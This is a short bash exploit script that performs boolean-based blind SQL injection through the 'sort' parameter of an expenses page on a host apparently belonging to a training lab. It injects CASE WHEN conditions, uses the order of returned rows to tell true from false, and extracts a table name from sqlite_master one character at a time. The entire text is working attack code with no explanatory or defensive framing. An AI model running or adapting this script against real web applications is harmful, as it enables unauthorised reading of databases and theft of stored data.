#!/bin/bash
A="http://xebec.cylabacademy.net:17222"
probe() {
  local cond="$1"
  local q="(CASE WHEN ${cond} THEN amount ELSE -amount END)"
  curl -s -m 20 -b /tmp/j752.txt --get --data-urlencode "sort=$q" "$A/expenses" \
    | grep -oE "<td>(AAA|BBB)</td>" | head -1
}
echo "=== sanity : 1=1 puis 1=0 ==="
echo -n "1=1 -> "; probe "1=1"
echo -n "1=0 -> "; probe "1=0"
echo
echo "=== tables (sqlite_master) ==="
for i in $(seq 1 12); do
  ch=$(python3 -c "print(chr($i+96))")
  r=$(probe "substr((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1),$i,1)>'$ch'")
  echo "  pos $i: $r"
done
